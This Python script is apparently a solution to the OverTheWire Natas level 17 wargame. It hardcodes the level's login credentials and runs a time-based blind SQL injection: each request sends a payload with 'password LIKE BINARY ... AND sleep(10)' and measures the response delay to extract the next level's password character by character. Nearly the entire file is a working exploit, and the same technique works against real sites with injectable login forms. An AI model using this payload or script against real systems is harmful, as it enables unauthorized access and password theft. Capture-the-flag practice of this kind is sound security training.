import requests
import string
import time

URL = 'http://natas17.natas.labs.overthewire.org/index.php'
AUTH = ('natas17', 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
# HEADERS = {'Authorization': 'Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA=='}

LETTERS = string.ascii_letters + string.digits
LETTERS = string.digits + string.ascii_letters

password = ''

def check_payload(tmp_password, is_double_checking = False) -> bool:
    """
        execute query and double check the response time
    """

    while True:
        try:
            data = {'username': f'natas18" AND password LIKE BINARY "{tmp_password}%" AND sleep(10); #'}
            start_time = time.time()
            response = requests.post(url=URL, data=data, auth=AUTH)
            if response.status_code == 200:
                execute_time = time.time() - start_time
                if execute_time > 10:
                    if is_double_checking:
                        return True
                    else:
                        print(' Double checking ', tmp_password, end='\r')
                        if check_payload(tmp_password, is_double_checking=True):
                            return True
                else:
                    return False
            else:
                print('--------------')
                print('Error', response.status_code)
                print(response.url, tmp_password)
                print('--------------')

        except ConnectionResetError:
            print('connection Error Trying Again')
        except requests.exceptions.ConnectionError:
            print('connection Error Trying Again')

while len(password) != 32:
    for i in LETTERS:
        tmp_password = password + i
        not_found_letters = (31 - len(password)) * '-'
        print(' TESTING : ', password, f'[{i}]' ,not_found_letters , sep='', end='\r') 
        if check_payload(tmp_password):
            password = tmp_password
            break


print(' \r \nFOUND ! ! !')
print('the password is :', password)



